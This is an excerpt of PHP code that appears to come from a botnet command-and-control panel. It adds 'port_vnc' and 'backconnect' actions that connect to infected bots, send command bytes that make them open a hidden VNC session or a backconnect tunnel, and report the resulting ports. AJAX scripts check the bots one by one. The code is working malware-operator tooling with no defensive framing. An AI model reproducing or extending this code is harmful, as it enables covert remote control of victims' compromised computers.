...
$botMenu = array(
                 ...
                 array('backconnect',     LNG_MBA_BACKCONNECT,      array('r_botnet_bots')),
				 array('port_vnc',        LNG_MBA_PORT_VNC,         array('r_botnet_bots')),
                );
...
JS_SCRIPT;
  ...
  else if(strcmp($ba, 'port_vnc') === 0)
  {
    ...
    if(isset($_GET['ipv4']) && isset($_GET['port']))
    {
      ...
      if(($s = @fsockopen($_GET['ipv4'], $_GET['port'], $errn, $errs, 5)))
      {
	 $data = pack('C', 10); //Заголовок VNC (prosim bota otkrit VNC sessiyu na randomnom portu.
        @stream_set_timeout($s, 5);
        if(@fwrite($s, $data) && ($data = @fread($s, 4)) && ($data = unpack('I', $data)) != 0)$ok = 1;
        fclose($s);
        
      }
      
      if($ok == 1)echo str_replace('{TEXT}', 'VNC: '.$_GET['ipv4'].':'.$data[1], THEME_STRING_SUCCESS);
      else        echo str_replace('{TEXT}', LNG_BA_PORT_SOCKS_FAILED,  THEME_STRING_ERROR);
    ...
    $data =
    str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(3, LNG_BA_PORT_VNC_TITLE), THEME_LIST_TITLE);
    ...
    $ajaxError = addJsSlashes(str_replace('{TEXT}', LNG_BA_PORT_SOCKS_ERROR, THEME_STRING_ERROR));
    $ajaxInit  = jsXmlHttpRequest('socksHttp');
    $q         = addJsSlashes(QUERY_SCRIPT.'?botsaction=port_vnc&bots[]=0');
    $ajax      =
<<<JS_SCRIPT
var socksList = [{$jsList}];
var socksHttp = false;
...
{
  var el = document.getElementById(socksList[i][0]);
  if(socksHttp.status == 200 && socksHttp.responseText.length > 5)
  {
	el.innerHTML = socksHttp.responseText;
  }
  else el.innerHTML = '{$ajaxError}';
  VncCheck(++i);
}}
...
JS_SCRIPT;
    ...
    themeSmall(LNG_BA_PORT_VNC_TITLE, $data.THEME_LIST_END, $ajax, getBotJsMenu('botmenu'), ' onload="VncCheck(0);"');
  }
  else if(strcmp($ba, 'backconnect') === 0)
  {

	//Проверка Backconnect.
    if(isset($_GET['ipv4']) && isset($_GET['port']))
    {
      $ok = 0;
      if(($s = @fsockopen($_GET['ipv4'], $_GET['port'], $errn, $errs, 5)))
      {
		$data = pack('C', 11); //Заголовок Backconnect
        @stream_set_timeout($s, 5);
        if(@fwrite($s, $data) && ($cPort = @fread($s, 4)) && ($bPort = @fread($s, 4)) && ($cPort = unpack('I', $cPort)) != 0 && ($bPort = unpack('I', $bPort)) != 0)$ok = 1;
        fclose($s);
      ...
      if($ok == 1)
	  {
		echo str_replace('{TEXT}', 'Client port: '.$cPort[1].', bot port: '.$bPort[1], THEME_STRING_SUCCESS);
	  }
      else        echo str_replace('{TEXT}', LNG_BA_BACKCONNECT_FAILED,  THEME_STRING_ERROR);
    ...
    $data =
    str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(3, LNG_BA_BACKCONNECT_TITLE), THEME_LIST_TITLE);
    ...
    $ajaxError = addJsSlashes(str_replace('{TEXT}', LNG_BA_PORT_SOCKS_ERROR, THEME_STRING_ERROR));
    $ajaxInit  = jsXmlHttpRequest('socksHttp');
    $q         = addJsSlashes(QUERY_SCRIPT.'?botsaction=backconnect&bots[]=0');
    $ajax      =
<<<JS_SCRIPT
var socksList = [{$jsList}];
var socksHttp = false;
...
JS_SCRIPT;
    ...
    themeSmall(LNG_BA_BACKCONNECT_TITLE, $data.THEME_LIST_END, $ajax, getBotJsMenu('botmenu'), ' onload="BcCheck(0);"');
